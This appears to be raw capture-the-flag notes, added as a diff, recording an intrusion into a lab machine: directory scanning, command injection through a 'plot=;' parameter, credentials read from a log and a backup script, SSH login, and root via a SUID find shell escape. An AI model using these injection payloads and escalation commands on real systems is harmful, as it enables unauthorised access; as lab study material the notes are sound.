@@ -1,0 +1,188 @@
+
+
+
+User-agent: *
+Disallow: /
+
+/tmp
+/.ssh
+/yellow
+/not
+/a+rabbit
+/hole
+/or
+/is
+/it
+
+079 084 108 105 077 068 089 050 077 071 078 107 079 084 086 104 090 071 086 104 077 122 073 051 089 122 085 048 077 084 103 121 089 109 070 104 078 084 069 049 079 068 081 075
+
+┌──(root㉿kali)-[~]
+└─# dirb http://10.201.123.237
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Tue Nov  4 14:06:11 2025
+URL_BASE: http://10.201.123.237/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://10.201.123.237/ ----
++ http://10.201.123.237/index.html (CODE:200|SIZE:11321)                                                            
+==> DIRECTORY: http://10.201.123.237/joomla/                                                                        
+==> DIRECTORY: http://10.201.123.237/manual/                                                                        
++ http://10.201.123.237/robots.txt (CODE:200|SIZE:257)                                                              
++ http://10.201.123.237/server-status (CODE:403|SIZE:302)                                                           
+                                                                                                                    
+---- Entering directory: http://10.201.123.237/joomla/ ----
+==> DIRECTORY: http://10.201.123.237/joomla/_archive/                                                               
+==> DIRECTORY: http://10.201.123.237/joomla/_database/                                                              
+==> DIRECTORY: http://10.201.123.237/joomla/_files/                                                                 
+==> DIRECTORY: http://10.201.123.237/joomla/_test/  
+
+http://10.201.123.237/joomla/_test/index.php?plot=;ls
+
+then the dropdown allows us to select log.txt
+
+then we 
+http://10.201.123.237/joomla/_test/index.php?plot=;cat%20log.txt
+
+in the dropdown we then see a log for 
+basterd:superduperp@$$
+
+
+machine timeout -- ip changed
+
+┌──(root㉿kali)-[~]
+└─# ssh -p 55007 basterd@10.201.62.54
+The authenticity of host '[10.201.62.54]:55007 ([10.201.62.54]:55007)' can't be established.
+ED25519 key fingerprint is SHA256:GhS3mY+uTmthQeOzwxRCFZHv1MN2hrYkdao9HJvi8lk.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '[10.201.62.54]:55007' (ED25519) to the list of known hosts.
+basterd@10.201.62.54's password: 
+Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic i686)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+8 packages can be updated.
+8 updates are security updates.
+
+
+Last login: Thu Aug 22 12:29:45 2019 from 192.168.1.199
+$ ls -lsa
+total 16
+4 drwxr-x--- 3 basterd basterd 4096 Aug 22  2019 .
+4 drwxr-xr-x 4 root    root    4096 Aug 22  2019 ..
+4 -rwxr-xr-x 1 stoner  basterd  699 Aug 21  2019 backup.sh
+0 -rw------- 1 basterd basterd    0 Aug 22  2019 .bash_history
+4 drwx------ 2 basterd basterd 4096 Aug 22  2019 .cache
+$ cat backup.sh
+REMOTE=1.2.3.4
+
+SOURCE=/home/stoner
+TARGET=/usr/local/backup
+
+LOG=/home/stoner/bck.log
+ 
+DATE=`date +%y\.%m\.%d\.`
+
+USER=stoner
+#superduperp@$$no1knows
+
+ssh $USER@$REMOTE mkdir $TARGET/$DATE
+
+
+if [ -d "$SOURCE" ]; then
+    for i in `ls $SOURCE | grep 'data'`;do
+	     echo "Begining copy of" $i  >> $LOG
+	     scp  $SOURCE/$i $USER@$REMOTE:$TARGET/$DATE
+	     echo $i "completed" >> $LOG
+		
+		if [ -n `ssh $USER@$REMOTE ls $TARGET/$DATE/$i 2>/dev/null` ];then
+		    rm $SOURCE/$i
+		    echo $i "removed" >> $LOG
+		    echo "####################" >> $LOG
+				else
+					echo "Copy not complete" >> $LOG
+					exit 0
+		fi 
+    done
+     
+
+else
+
+    echo "Directory is not present" >> $LOG
+    exit 0
+fi
+$ 
+
+$ cd /home
+$ ls -lsa
+total 16
+4 drwxr-xr-x  4 root    root    4096 Aug 22  2019 .
+4 drwxr-xr-x 22 root    root    4096 Aug 22  2019 ..
+4 drwxr-x---  3 basterd basterd 4096 Aug 22  2019 basterd
+4 drwxr-x---  3 stoner  stoner  4096 Aug 22  2019 stoner
+
+$ su stoner
+Password: 
+stoner@Vulnerable:/home$ 
+
+
+
+
+stoner@Vulnerable:/home$ find / -perm -4000 2>/dev/null
+/bin/su
+/bin/fusermount
+/bin/umount
+/bin/mount
+/bin/ping6
+/bin/ping
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/apache2/suexec-custom
+/usr/lib/apache2/suexec-pristine
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/bin/newgidmap
+/usr/bin/find
+/usr/bin/at
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/bin/sudo
+/usr/bin/pkexec
+/usr/bin/gpasswd
+/usr/bin/newuidmap
+stoner@Vulnerable:/home$ 
+
+
+
+# /usr/bin/find . -exec /bin/sh -p \; -quit
+# id
+uid=1000(stoner) gid=1000(stoner) euid=0(root) groups=1000(stoner),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
+# 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
